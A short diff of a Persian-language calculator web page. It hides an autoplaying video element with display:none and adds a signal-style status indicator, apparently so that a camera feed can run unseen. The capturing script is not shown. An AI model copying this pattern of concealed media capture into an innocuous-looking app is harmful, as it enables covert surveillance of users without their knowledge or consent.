@@ -4,14 +4,13 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>ماشین حساب پیشرفته</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-   <script src="script.js"></script>
   <div class="calculator">
     <div class="history" id="history"></div>
     <div class="display" id="display">0</div>
+    <div id="status" class="history">📡 وضعیت</div> <!-- اضافه شده -->
     <div class="buttons">
       <button class="clear" onclick="clearDisplay()">C</button>
       <button onclick="backspace()">←</button>
@@ -41,8 +40,7 @@
       <button class="equal" onclick="calculate()">=</button>
     </div>
   </div>
-  <div id="status">🟡 آماده</div>
-   <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline style="display: none;"></video> <!-- پنهان برای جلوگیری از نمایش -->
 
   <script src="script.js"></script>
 </body>
